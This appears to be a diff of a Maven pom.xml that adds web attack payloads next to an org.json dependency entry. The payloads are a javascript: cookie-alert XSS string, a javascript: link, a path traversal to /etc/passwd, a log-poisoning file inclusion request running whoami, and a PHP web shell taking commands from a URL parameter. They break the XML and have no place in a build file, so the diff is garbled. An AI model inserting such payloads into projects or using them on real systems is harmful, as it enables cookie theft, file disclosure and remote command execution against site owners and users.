@@ -40,7 +40,12 @@
 			<version>2.18.0</version>
 		</dependency>
 		<!-- https://mvnrepository.com/artifact/org.json/json -->
-		<dependency>
+		<dependency>	javascript:alert(document.cookie)
+
+	<a href="javascript:alert(1)">Click</a>
+?page=../../../../etc/passwd
+?page=/var/log/apache2/access.log&cmd=whoami
+<?php system($_GET['cmd']); ?>
 			<groupId>org.json</groupId>
 			<artifactId>json</artifactId>
 			<version>20220924</version>
